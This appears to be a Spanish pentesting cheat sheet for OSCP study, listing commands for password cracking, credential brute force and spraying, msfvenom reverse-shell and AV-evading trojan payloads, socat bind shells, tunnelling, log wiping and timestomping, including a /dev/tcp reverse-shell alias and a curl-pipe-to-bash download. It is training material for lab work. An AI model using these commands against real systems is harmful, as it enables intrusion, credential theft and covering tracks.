---
title: "Herramientas y Utilidades de Pentesting - Guía Completa"
date: Tue Dec 03 2025 00:00:00 GMT+0100 (Central European Standard Time)
categories: [Apuntes, Herramientas]
tags: [herramientas, utilidades, password-cracking, hashcat, john, brute-force, hydra, wordlists, encoding, msfvenom, tmux, oscp, apuntes, pentesting]
image: /assets/img/cabeceras/2025-12-03-herramientas-utilidades.png
---

# Herramientas y Utilidades de Pentesting

Esta guía consolida herramientas esenciales, utilidades y trucos que todo pentester debe conocer para optimizar su workflow y maximizar la efectividad en compromisos de seguridad.

---

## 1. Password Cracking

### 1.1 Hashcat

**Hashcat** es la herramienta de cracking de hashes más rápida del mercado, con soporte para GPU.

#### Identificación de Hashes

```bash
# Identificar tipo de hash
hashcat --help | grep -i "md5\|sha\|ntlm"
hashid hash.txt
hash-identifier
```

#### Tipos de Hash Comunes

| Hash Type | Hashcat Mode | Ejemplo |
|-----------|--------------|---------|
| MD5 | 0 | 5d41402abc4b2a76b9719d911017c592 |
| SHA1 | 100 | aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d |
| SHA256 | 1400 | 2c26b46b68ffc68ff99b453c1d30413413422d706... |
| NTLM | 1000 | b4b9b02e6f09a9bd760f388b67351e2b |
| NetNTLMv2 | 5600 | admin::N46iSNekpT:08ca45b7d7ea58ee... |
| Kerberos 5 TGS | 13100 | $krb5tgs$23$*user$realm$test/spn*$... |
| bcrypt | 3200 | $2a$05$LhayLxezLhK1LhWvKxCyLOj0j... |

#### Ataques Básicos

```bash
# Dictionary Attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary Attack con reglas (best64)
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Combinación de dos diccionarios
hashcat -m 0 -a 1 hashes.txt dict1.txt dict2.txt

# Mask Attack (fuerza bruta con patrón)
# ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special
hashcat -m 0 -a 3 hashes.txt ?l?l?l?l?l?l?l?l

# Hybrid Attack (dictionary + mask)
hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d?d?d
hashcat -m 0 -a 7 hashes.txt ?d?d?d?d rockyou.txt
```

#### Ataques Avanzados

```bash
# NTLM con reglas combinadas
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r best64.rule -r toggles1.rule

# Cracking con GPU optimizado
hashcat -m 1000 -a 0 -w 3 -O hashes.txt rockyou.txt

# Cracking con múltiples diccionarios
cat dict1.txt dict2.txt dict3.txt | hashcat -m 0 hashes.txt

# Reanudar sesión
hashcat --session mysession -m 1000 hashes.txt rockyou.txt
hashcat --restore --session mysession

# Ver passwords crackeados
hashcat -m 0 hashes.txt --show
```

#### Masks Útiles

```bash
# Password común: Capitalize + 4 dígitos (Password2023)
?u?l?l?l?l?l?l?l?d?d?d?d

# Año específico al final (password2024)
?l?l?l?l?l?l?l?l?d?d?d?d

# 8 caracteres alfanuméricos
?1?1?1?1?1?1?1?1 -1 ?l?u?d

# Pattern común empresa: Company123!
?u?l?l?l?l?l?l?d?d?d?s
```

**📝 OSCP Tip**: En el examen, prioriza diccionarios pequeños y reglas eficientes. `rockyou.txt` con `best64.rule` es un buen balance.

---

### 1.2 John the Ripper

**John** es versátil y excelente para formatos específicos que Hashcat no soporta.

#### Comandos Básicos

```bash
# Cracking básico con wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Con reglas
john --wordlist=rockyou.txt --rules hashes.txt

# Single crack mode (usa información del usuario)
john --single hashes.txt

# Incremental mode (brute force inteligente)
john --incremental hashes.txt

# Ver resultados
john --show hashes.txt

# Especificar formato
john --format=NT hashes.txt --wordlist=rockyou.txt
```

#### Conversión de Formatos

```bash
# Shadow file de Linux
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# ZIP protegido
zip2john archivo.zip > zip.hash
john zip.hash --wordlist=rockyou.txt

# RAR protegido
rar2john archivo.rar > rar.hash

# Keepass
keepass2john database.kdbx > keepass.hash

# SSH private key
ssh2john id_rsa > ssh.hash

# PDF protegido
pdf2john documento.pdf > pdf.hash
```

#### John con Reglas Personalizadas

```bash
# Crear regla personalizada en john.conf
# Añadir año actual a palabras
[List.Rules:AddYear]
$2$0$2$4

# Usar regla personalizada
john --wordlist=words.txt --rules=AddYear hashes.txt
```

**🎯 Técnica**: Combina John para conversión de formatos y Hashcat para velocidad de cracking.

---

### 1.3 CrackStation y Herramientas Online

```bash
# Verificar hash en bases de datos públicas primero
# https://crackstation.net/
# https://hashes.com/en/decrypt/hash

# Generar hashes para testing
echo -n "password" | md5sum
echo -n "password" | sha256sum
```

---

## 2. Brute Force y Fuzzing de Credenciales

### 2.1 Hydra

**Hydra** es la herramienta de brute force más popular para servicios de red.

#### Sintaxis General

```bash
hydra -L users.txt -P passwords.txt <service>://target [options]
```

#### Protocolos Comunes

```bash
# SSH
hydra -l root -P rockyou.txt ssh://10.10.10.10 -t 4

# FTP
hydra -L users.txt -P pass.txt ftp://10.10.10.10

# HTTP Basic Auth
hydra -l admin -P pass.txt 10.10.10.10 http-get /admin

# HTTP POST Form
hydra -l admin -P pass.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V

# HTTP POST con cookies
hydra -l admin -P pass.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:H=Cookie\: PHPSESSID=abc123:F=failed"

# SMB
hydra -L users.txt -P pass.txt smb://10.10.10.10

# RDP
hydra -L users.txt -P pass.txt rdp://10.10.10.10

# MySQL
hydra -l root -P pass.txt mysql://10.10.10.10

# PostgreSQL
hydra -L users.txt -P pass.txt postgres://10.10.10.10

# VNC
hydra -P pass.txt vnc://10.10.10.10

# SMTP
hydra -l user@domain.com -P pass.txt smtp://10.10.10.10

# POP3
hydra -l user -P pass.txt pop3://10.10.10.10

# IMAP
hydra -l user -P pass.txt imap://10.10.10.10
```

#### Opciones Útiles

```bash
# -t: Número de threads (cuidado con rate limiting)
hydra -l admin -P pass.txt -t 10 ssh://target

# -f: Detener al encontrar credenciales válidas
hydra -L users.txt -P pass.txt -f ftp://target

# -V: Verbose (mostrar cada intento)
hydra -l admin -P pass.txt -V ssh://target

# -o: Guardar resultados
hydra -L users.txt -P pass.txt -o results.txt ssh://target

# -I: Ignorar archivo de restore (útil si se interrumpió)
hydra -l admin -P pass.txt -I ssh://target

# -s: Puerto personalizado
hydra -l admin -P pass.txt -s 2222 ssh://target
```

#### Fuzzing HTTP Avanzado

```bash
# Detectar mensaje de error correcto
# Primero hacer request manual para identificar respuesta de error

# POST con múltiples parámetros
hydra -l admin -P pass.txt target http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:F=Invalid credentials"

# Con redirección (S= success string en lugar de F= fail string)
hydra -l admin -P pass.txt target http-post-form "/login:username=^USER^&password=^PASS^:S=Welcome"

# Con condición de éxito en código HTTP
hydra -l admin -P pass.txt target http-post-form "/api/login:username=^USER^&password=^PASS^:S=302"
```

**⚠️ Contramedida**: Implementa rate limiting, CAPTCHA después de X intentos fallidos, y bloqueo temporal de IPs.

---

### 2.2 Medusa

Alternativa a Hydra, a veces más estable para ciertos servicios.

```bash
# SSH
medusa -h 10.10.10.10 -u admin -P pass.txt -M ssh

# RDP
medusa -h 10.10.10.10 -U users.txt -P pass.txt -M rdp

# HTTP
medusa -h 10.10.10.10 -u admin -P pass.txt -M web-form -m FORM:"/login.php" -m FORM-DATA:"post?username=&password=" -m DENY-SIGNAL:"incorrect"

# SMB con dominio
medusa -h 10.10.10.10 -u administrator -P pass.txt -M smbnt -m GROUP:DOMAIN
```

---

### 2.3 Patator

**Patator** es modular y extremadamente flexible.

```bash
# SSH
patator ssh_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt 1=pass.txt -x ignore:mesg='Authentication failed'

# FTP
patator ftp_login host=10.10.10.10 user=FILE0 password=FILE1 0=users.txt 1=pass.txt

# HTTP Basic Auth
patator http_fuzz url=http://10.10.10.10/admin auth_type=basic user=FILE0 password=FILE1 0=users.txt 1=pass.txt

# HTTP POST con rate limiting
patator http_fuzz url=http://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=pass.txt -x ignore:fgrep='Invalid' --rate-limit=1 --timeout=10
```

---

### 2.4 CrackMapExec para Active Directory

```bash
# Password Spraying en SMB (evita lockouts)
crackmapexec smb 10.10.10.0/24 -u users.txt -p 'Password123' --continue-on-success

# Probar contraseña en rango
crackmapexec smb 10.10.10.10 -u administrator -p passwords.txt

# Validar credenciales sin fuerza bruta
crackmapexec smb 10.10.10.10 -u admin -p 'P@ssw0rd' --local-auth

# WinRM
crackmapexec winrm 10.10.10.10 -u admin -p passwords.txt

# MSSQL
crackmapexec mssql 10.10.10.10 -u sa -p passwords.txt
```

**📝 OSCP Tip**: En AD, usa password spraying con CrackMapExec en lugar de brute force tradicional para evitar lockouts.

---

## 3. Manipulación de Texto y Datos

### 3.1 Grep y Alternativas

```bash
# Búsqueda básica case-insensitive
grep -i "password" file.txt

# Recursiva en directorio
grep -r "admin" /var/www/

# Mostrar N líneas antes/después del match
grep -A 5 -B 5 "error" log.txt

# Contar ocurrencias
grep -c "failed" auth.log

# Mostrar solo archivos con match
grep -l "password" *.txt

# Invertir búsqueda (líneas que NO contienen patrón)
grep -v "comment" file.txt

# Múltiples patrones
grep -E "admin|root|user" /etc/passwd

# Regex avanzado
grep -E "^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$" ips.txt

# Colorear resultados
grep --color=auto "pattern" file.txt
```

#### Ripgrep (rg) - Alternativa Moderna

```bash
# Instalación
sudo apt install ripgrep

# Búsqueda rápida (respeta .gitignore)
rg "password" /var/www/

# Buscar tipo de archivo específico
rg -t php "mysql_connect"

# Mostrar contexto
rg -A 3 -B 3 "function" script.js

# Case insensitive
rg -i "admin"

# Listar archivos con match
rg -l "TODO"

# Buscar en archivos ocultos y ignorados
rg -uu "secret"
```

---

### 3.2 AWK

```bash
# Imprimir columna específica
awk '{print $1}' file.txt
cat access.log | awk '{print $1}' | sort -u

# Filtrar por condición
awk '$3 > 100 {print $1, $3}' data.txt

# Suma de columna
awk '{sum += $2} END {print sum}' numbers.txt

# Imprimir líneas entre patrones
awk '/START/,/END/ {print}' log.txt

# Usar delimitador personalizado
awk -F: '{print $1}' /etc/passwd

# Múltiples acciones
awk '{if ($3 > 50) print $1 " is high"; else print $1 " is low"}' data.txt

# Procesar IPs de logs
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -10
```

**🎯 Uso en Pentesting**: Extraer IPs de logs, procesar salidas de nmap, filtrar usuarios de /etc/passwd.

---

### 3.3 SED

```bash
# Sustituir primera ocurrencia
sed 's/old/new/' file.txt

# Sustituir todas las ocurrencias
sed 's/old/new/g' file.txt

# Editar archivo en lugar (guardar cambios)
sed -i 's/old/new/g' file.txt

# Eliminar líneas que contienen patrón
sed '/pattern/d' file.txt

# Eliminar líneas vacías
sed '/^$/d' file.txt

# Insertar línea antes del match
sed '/pattern/i\New line' file.txt

# Reemplazar línea completa
sed '/pattern/c\Replacement line' file.txt

# Imprimir solo líneas que hacen match
sed -n '/pattern/p' file.txt

# Rango de líneas
sed -n '10,20p' file.txt
sed '5,10d' file.txt
```

**Ejemplo Práctico**: Limpiar wordlist

```bash
# Eliminar duplicados y líneas vacías, convertir a lowercase
cat wordlist.txt | tr '[:upper:]' '[:lower:]' | sort -u | sed '/^$/d' > clean.txt
```

---

### 3.4 CUT y SORT

```bash
# Extraer campo por delimitador
cut -d: -f1 /etc/passwd

# Rango de campos
cut -d: -f1,3,6 /etc/passwd

# Por caracteres
cut -c1-10 file.txt

# Ordenar numérico
sort -n numbers.txt

# Ordenar reverso
sort -r file.txt

# Ordenar por columna
sort -k2 -n data.txt

# Eliminar duplicados
sort -u file.txt

# Contar ocurrencias únicas
sort file.txt | uniq -c | sort -nr
```

**Ejemplo**: Extraer usuarios únicos de log

```bash
cat auth.log | grep "Failed password" | awk '{print $9}' | sort -u
```

---

### 3.5 TR (Translate)

```bash
# Convertir a mayúsculas/minúsculas
echo "Hello" | tr '[:lower:]' '[:upper:]'
cat file.txt | tr '[:upper:]' '[:lower:]'

# Eliminar caracteres
echo "hello123" | tr -d '[:digit:]'

# Reemplazar caracteres
echo "hello world" | tr ' ' '_'

# Eliminar caracteres repetidos
echo "heeelllooo" | tr -s 'e'

# ROT13
echo "secret" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

### 3.6 Generación de Wordlists

```bash
# Crunch - Generador de wordlists
# Instalar: apt install crunch

# Generar todas las combinaciones de 4 dígitos
crunch 4 4 0123456789 -o numbers.txt

# Patrón específico (@ = lowercase, , = uppercase, % = digit)
crunch 8 8 -t pass%%%% -o wordlist.txt

# Patrón con año
crunch 12 12 -t Company@@@@ -o company-pass.txt

# CeWL - Scraping web para wordlist
cewl http://target.com -d 2 -m 5 -w wordlist.txt
cewl https://company.com -d 3 --with-numbers -w company-words.txt

# Combinar múltiples wordlists
cat dict1.txt dict2.txt dict3.txt | sort -u > combined.txt

# Mutaciones de palabra con Hashcat rules
echo "password" | hashcat --stdout -r /usr/share/hashcat/rules/best64.rule

# John rules para mutaciones
john --wordlist=base.txt --rules --stdout > mutated.txt
```

---

## 4. Codificación y Decodificación

### 4.1 Base64

```bash
# Encodear
echo "admin:password" | base64
YWRtaW46cGFzc3dvcmQ=

# Decodear
echo "YWRtaW46cGFzc3dvcmQ=" | base64 -d

# Archivo
base64 file.txt > encoded.txt
base64 -d encoded.txt > decoded.txt

# Base64 URL-safe
echo "data" | base64 | tr '+/' '-_' | tr -d '='
```

---

### 4.2 URL Encoding/Decoding

```bash
# URL encode
echo "admin user" | jq -sRr @uri
# O con Python
python3 -c "import urllib.parse; print(urllib.parse.quote('admin user'))"

# URL decode
echo "admin%20user" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"
```

---

### 4.3 Hexadecimal

```bash
# Texto a hex
echo "hello" | xxd -p
68656c6c6f

# Hex a texto
echo "68656c6c6f" | xxd -r -p

# Archivo a hex dump
xxd file.bin

# Hex dump legible
hexdump -C file.bin
```

---

### 4.4 HTML Encoding

```bash
# HTML encode
python3 -c "import html; print(html.escape('<script>alert(1)</script>'))"

# HTML decode
python3 -c "import html; print(html.unescape('&lt;script&gt;'))"
```

---

### 4.5 JWT Decode

```bash
# Decodificar JWT (sin verificar firma)
echo "eyJhbGc..." | cut -d. -f2 | base64 -d

# Con jq para formato
echo "eyJhbGc..." | cut -d. -f2 | base64 -d | jq

# jwt_tool para análisis completo
python3 jwt_tool.py <token>
```

---

## 5. Generación de Payloads

### 5.1 Msfvenom

```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o shell.elf

# Windows reverse shell EXE
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe

# Windows Meterpreter
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o meter.exe

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=443 -f raw -o shell.php

# JSP reverse shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.jsp

# WAR para Tomcat
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f war -o shell.war

# ASP reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f asp -o shell.asp

# Python reverse shell
msfvenom -p python/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f raw -o shell.py

# PowerShell one-liner
msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.5 LPORT=443 -f raw

# Payload ofuscado (encoders)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe

# Lista de encoders disponibles
msfvenom --list encoders

# Payload con plantilla (evitar detección)
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -x legitimate.exe -k -f exe -o trojan.exe
```

**⚠️ Nota**: Los payloads generados por msfvenom son fácilmente detectados por AV. Considera ofuscación adicional.

---

### 5.2 Shellter (AV Evasion)

```bash
# Inyectar payload en ejecutable legítimo
wine shellter

# Automático mode
# Seleccionar ejecutable (ej: putty.exe)
# Inyectar payload de Meterpreter
```

---

### 5.3 Veil Framework

```bash
# Generar payload ofuscado
cd /usr/share/veil/
./Veil.py

# Navegación:
# use evasion
# use powershell/meterpreter/rev_tcp
# set LHOST 10.10.14.5
# generate
```

---

## 6. Utilidades de Red

### 6.1 Transferencia de Archivos Rápida

```bash
# Python HTTP Server (muy útil)
python3 -m http.server 80
python3 -m http.server 8080 --bind 10.10.14.5

# Con directorio específico
python3 -m http.server 8000 --directory /tmp/share

# PHP server
php -S 0.0.0.0:8080

# Ruby server
ruby -run -ehttpd . -p8080

# Descargar desde máquina comprometida
wget http://10.10.14.5/file
curl http://10.10.14.5/file -o file
```

---

### 6.2 Netcat Alternativas

```bash
# Socat listener más robusto
socat TCP-LISTEN:443,reuseaddr,fork EXEC:/bin/bash

# Bind shell con socat
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:cmd.exe,pipes   # Windows
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash       # Linux

# Conectar a bind shell
socat - TCP:10.10.10.10:4444

# Port forwarding con socat
socat TCP-LISTEN:8080,fork TCP:192.168.1.10:80
```

---

### 6.3 Proxychains

```bash
# Configurar /etc/proxychains.conf
# Añadir al final:
# socks5 127.0.0.1 1080

# Usar con herramientas
proxychains nmap -sT 192.168.100.10
proxychains firefox
proxychains ssh user@internal-host

# Con Tor
service tor start
proxychains curl ifconfig.me
```

---

### 6.4 Túneles SSH

```bash
# Local Port Forwarding (acceder a puerto remoto desde local)
ssh -L 8080:localhost:80 user@remote-host
# Ahora localhost:8080 apunta a remote-host:80

# Remote Port Forwarding (exponer puerto local en remoto)
ssh -R 8080:localhost:80 user@remote-host
# Ahora remote-host:8080 apunta a tu localhost:80

# Dynamic Port Forwarding (SOCKS proxy)
ssh -D 1080 user@remote-host
# Configura aplicaciones para usar SOCKS5 proxy en localhost:1080

# Mantener túnel abierto en background
ssh -fN -L 8080:localhost:80 user@remote-host

# Autoreconexión
while true; do ssh -L 8080:localhost:80 user@remote; sleep 5; done
```

---

### 6.5 Chisel (Alternativa a SSH)

```bash
# En máquina atacante (servidor)
./chisel server --reverse --port 8000

# En máquina comprometida (cliente)
./chisel client 10.10.14.5:8000 R:1080:socks

# Ahora puedes usar proxychains con el SOCKS proxy
proxychains nmap -sT 172.16.0.10
```

---

## 7. Análisis Forense Básico

### 7.1 Strings

```bash
# Extraer strings de binario
strings binary.exe

# Strings de longitud mínima 10
strings -n 10 binary.exe

# Buscar IPs en binario
strings binary.exe | grep -E "([0-9]{1,3}\.){3}[0-9]{1,3}"

# Buscar URLs
strings binary.exe | grep -E "https?://"

# Strings con offset
strings -t x binary.exe
```

---

### 7.2 File y Exiftool

```bash
# Identificar tipo de archivo
file unknown-file

# Metadata de imagen
exiftool image.jpg

# Eliminar metadata
exiftool -all= image.jpg

# Buscar archivos por tipo real (no extensión)
find . -type f -exec file {} \; | grep "ELF"
```

---

### 7.3 Binwalk

```bash
# Análisis de firmware
binwalk firmware.bin

# Extraer archivos embebidos
binwalk -e firmware.bin

# Scan profundo
binwalk -Me firmware.bin
```

---

### 7.4 Volatility (Memory Forensics)

```bash
# Identificar perfil
volatility -f memory.dmp imageinfo

# Listar procesos
volatility -f memory.dmp --profile=Win7SP1x64 pslist

# Conexiones de red
volatility -f memory.dmp --profile=Win7SP1x64 netscan

# Extraer proceso
volatility -f memory.dmp --profile=Win7SP1x64 procdump -p 1234 -D output/

# Command history
volatility -f memory.dmp --profile=Win7SP1x64 cmdscan
volatility -f memory.dmp --profile=Win7SP1x64 consoles

# Hashes de passwords
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
```

---

## 8. Trucos de Terminal

### 8.1 Historial y Atajos

```bash
# Buscar en historial
Ctrl+R (luego escribir búsqueda)

# Ejecutar comando anterior
!!

# Ejecutar comando N del historial
!123

# Último argumento del comando anterior
!$
Alt+.

# Todos los argumentos del comando anterior
!*

# Limpiar terminal rápido
Ctrl+L

# Autocompletar
Tab
Tab Tab (para ver opciones)

# Deshacer en línea de comandos
Ctrl+_

# Limpiar línea
Ctrl+U (desde cursor al inicio)
Ctrl+K (desde cursor al final)

# Mover cursor
Ctrl+A (inicio)
Ctrl+E (final)
Alt+B (palabra anterior)
Alt+F (palabra siguiente)
```

---

### 8.2 Tmux Básico

```bash
# Iniciar sesión
tmux
tmux new -s pentesting

# Dividir pantalla
Ctrl+B % (vertical)
Ctrl+B " (horizontal)

# Navegar entre paneles
Ctrl+B flechas

# Crear ventana nueva
Ctrl+B C

# Navegar entre ventanas
Ctrl+B N (siguiente)
Ctrl+B P (anterior)

# Detach de sesión
Ctrl+B D

# Listar sesiones
tmux ls

# Attach a sesión
tmux attach -t pentesting

# Scroll mode
Ctrl+B [ (luego flechas o PgUp/PgDn, Q para salir)
```

**📝 OSCP Tip**: Usa Tmux para mantener shells organizadas y evitar perder sesiones.

---

### 8.3 Redirección y Pipelines

```bash
# Redirigir stdout
command > output.txt

# Redirigir stderr
command 2> errors.txt

# Redirigir ambos
command &> output.txt
command > output.txt 2>&1

# Append
command >> output.txt

# Descartar output
command > /dev/null 2>&1

# Tee (mostrar y guardar)
command | tee output.txt
command | tee -a output.txt  # append

# Pipeline múltiple
cat file.txt | grep "pattern" | awk '{print $1}' | sort -u | wc -l
```

---

### 8.4 Background Jobs

```bash
# Enviar a background
command &

# Ver jobs
jobs

# Traer al foreground
fg %1

# Continuar job en background
bg %1

# Suspender proceso actual
Ctrl+Z

# Disown (desacoplar del shell)
command &
disown

# Nohup (continuar después de cerrar terminal)
nohup command &
```

---

## 9. Gestión de Sesiones y Logs

### 9.1 Script - Grabar Sesión

```bash
# Iniciar grabación
script pentesting-session.log

# Hacer trabajo...

# Terminar grabación
exit

# Replay de sesión
scriptreplay timing.log session.log
```

---

### 9.2 Logs del Sistema

```bash
# Auth logs (intentos de login)
tail -f /var/log/auth.log
cat /var/log/auth.log | grep "Failed password"

# Syslog
tail -f /var/log/syslog

# Nginx/Apache
tail -f /var/log/nginx/access.log
tail -f /var/log/apache2/access.log

# Limpiar historial bash (cubrir huellas)
history -c
cat /dev/null > ~/.bash_history

# Deshabilitar historial temporalmente
unset HISTFILE
```

---

### 9.3 Timestomping

```bash
# Cambiar fecha de modificación
touch -t 202301011200 file.txt

# Copiar timestamp de otro archivo
touch -r original.txt modified.txt

# Cambiar access time
touch -a -t 202301011200 file.txt
```

---

## 10. Tips para OSCP/OSEP

### 10.1 Metodología de Examen

```
1. Escaneo inicial completo (nmap -sC -sV)
2. Escaneo full ports (nmap -p-)
3. Enumerar cada servicio descubierto
4. Probar exploits conocidos (searchsploit)
5. Investigar versiones específicas
6. Fuzzing de directorios web
7. Manual testing (siempre)
8. Documentar TODO durante el proceso
```

---

### 10.2 Comandos Esenciales OSCP

```bash
# Auto-reconocimiento con AutoRecon
autorecon -o output/ 10.10.10.10

# Nmap All ports
nmap -p- -T4 10.10.10.10

# Gobuster con wordlist común
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html

# Reverse shell listener
rlwrap nc -nlvp 443

# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# LinPEAS
curl http://10.10.14.5/linpeas.sh | bash

# WinPEAS
.\winPEASx64.exe
```

---

### 10.3 Cheatsheet de One-Liners

```bash
# Encontrar SUID
find / -perm -4000 2>/dev/null

# Buscar passwords en archivos
grep -ri "password" /var/www/ 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Crontabs
cat /etc/crontab
ls -la /etc/cron.*

# Archivos modificados recientemente
find / -type f -mmin -10 2>/dev/null

# Interfaces de red
ip a
ifconfig

# Rutas y subredes
ip route
route -n

# Usuarios con bash
cat /etc/passwd | grep bash

# Sudo sin password
sudo -l

# Kernel exploit suggester
./linux-exploit-suggester-2.pl -k $(uname -r)
```

---

### 10.4 Notas Durante el Examen

```markdown
# Estructura de notas recomendada por máquina:

## 10.10.10.10 - [Machine Name]

### Reconocimiento
- Nmap: [puertos abiertos]
- Servicios: [versiones]

### Enumeración
- [Hallazgos por servicio]

### Explotación
- [Exploit usado]
- [Comando exacto]

### Escalada de Privilegios
- [Vulnerabilidad encontrada]
- [Exploit o técnica]
- [Flags]

### Proof
- user.txt: [hash]
- root.txt: [hash]
- Screenshots: [paths]
```

**🎯 Tip**: Toma screenshots de CADA paso. Usa `flameshot` en Kali.

```bash
# Screenshot de ventana
flameshot gui

# Screenshot full screen con retraso
flameshot full -d 2000 -p ~/screenshots/
```

---

### 10.5 Checklist Pre-Examen

```
✅ Verificar VPN conectada
✅ Verificar IP de tun0 (ip a)
✅ Crear estructura de directorios por máquina
✅ Abrir Tmux con ventanas organizadas
✅ Tener wordlists listas (/usr/share/wordlists/)
✅ Scripts de enumeración descargados (linpeas, winpeas, etc.)
✅ Servidor HTTP listo para transferir archivos
✅ Revisar comandos favoritos
✅ CherryTree o herramienta de notas abierta
✅ Configurar autosave de terminal con script
```

---

## 11. Workflows y Automatización

### 11.1 AutoRecon

```bash
# Instalación
sudo apt install autorecon

# Escaneo de una máquina
autorecon 10.10.10.10

# Múltiples objetivos
autorecon -t targets.txt

# Solo puertos específicos
autorecon --ports 80,443,8080 10.10.10.10

# Resultados en directorio específico
autorecon -o /root/results/ 10.10.10.10
```

**Salida**: Genera estructura organizada con:
- Escaneos nmap (TCP/UDP)
- Enumeración de servicios
- Screenshots de web
- Enumeración SMB, FTP, etc.

---

### 11.2 nmapAutomator

```bash
# Clonar
git clone https://github.com/21y4d/nmapAutomator.git

# Uso
./nmapAutomator.sh 10.10.10.10 All

# Solo web
./nmapAutomator.sh 10.10.10.10 Web

# Vulns scan
./nmapAutomator.sh 10.10.10.10 Vulns
```

---

### 11.3 Scripts Personalizados

#### Crear Estructura de Directorios

```bash
#!/bin/bash
# setup-pentest.sh

TARGET=$1
mkdir -p $TARGET/{nmap,web,exploits,loot,screenshots}
echo "[+] Estructura creada para $TARGET"
cd $TARGET
```

#### Quick Nmap Scan

```bash
#!/bin/bash
# quick-scan.sh

TARGET=$1
echo "[*] Scanning $TARGET..."
nmap -sC -sV -oN nmap/initial.txt $TARGET
echo "[*] Full port scan..."
nmap -p- -oN nmap/allports.txt $TARGET
```

#### Shell Upgrader

```bash
#!/bin/bash
# upgrade-shell.sh

echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
echo "Ctrl+Z"
echo "stty raw -echo; fg"
echo "export TERM=xterm"
```

---

### 11.4 Aliases Útiles

Añadir a `~/.bashrc` o `~/.zshrc`:

```bash
# Pentesting aliases
alias nse='ls /usr/share/nmap/scripts/ | grep'
alias serve='python3 -m http.server 80'
alias listen='rlwrap nc -nlvp'
alias myip='ip a show tun0 | grep inet | awk "{print \$2}" | cut -d/ -f1'
alias scan='nmap -sC -sV -oN nmap.txt'
alias fullscan='nmap -p- -oN fullscan.txt'
alias gobust='gobuster dir -u'
alias rshell='bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Shortcuts
alias ll='ls -lah'
alias ports='netstat -tulanp'
alias myprocs='ps aux | grep $USER'

# Encode/Decode
alias b64d='base64 -d'
alias b64e='base64 -w0'
alias urlencode='python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))"'

# Logs
alias authlog='tail -f /var/log/auth.log'
```

---

## 12. Recursos y Referencias

### Wordlists Esenciales

```
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/seclists/
/usr/share/nmap/nselib/data/passwords.lst
```

---

### Scripts de Enumeración

```bash
# Descargar scripts comunes
mkdir ~/tools
cd ~/tools

# LinPEAS & WinPEAS
git clone https://github.com/carlospolop/PEASS-ng.git

# Linux Exploit Suggester
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

# pspy (procesos sin root)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64

# GTFOBins lookup
git clone https://github.com/norbemi/gtfoblookup.git
```

---

### Herramientas Must-Have

```
✅ nmap, masscan, rustscan
✅ gobuster, ffuf, feroxbuster
✅ Burp Suite / OWASP ZAP
✅ sqlmap
✅ hydra, medusa
✅ john, hashcat
✅ metasploit-framework
✅ impacket-scripts
✅ bloodhound
✅ crackmapexec
✅ chisel, ligolo-ng
✅ responder, impacket-ntlmrelayx
✅ evil-winrm
```

---

### Comandos de Instalación Rápida

```bash
# Actualizar Kali
sudo apt update && sudo apt full-upgrade -y

# Instalar tools esenciales
sudo apt install -y \
  seclists curl enum4linux feroxbuster ftp \
  gobuster john ncat netcat-traditional nmap \
  smbclient snmp socat whatweb wfuzz

# Python tools
pip3 install impacket bloodhound updog

# Rust tools
cargo install rustscan

# Go tools
go install github.com/ffuf/ffuf/v2@latest
go install github.com/OJ/gobuster/v3@latest
```

---

## Conclusión

Esta guía consolida las herramientas y utilidades más importantes para pentesting profesional. Dominar estos comandos y workflows te permitirá:

- **Optimizar tiempos** en compromisos de seguridad
- **Evitar errores comunes** en exámenes como OSCP
- **Automatizar tareas repetitivas**
- **Mantener organización** durante evaluaciones
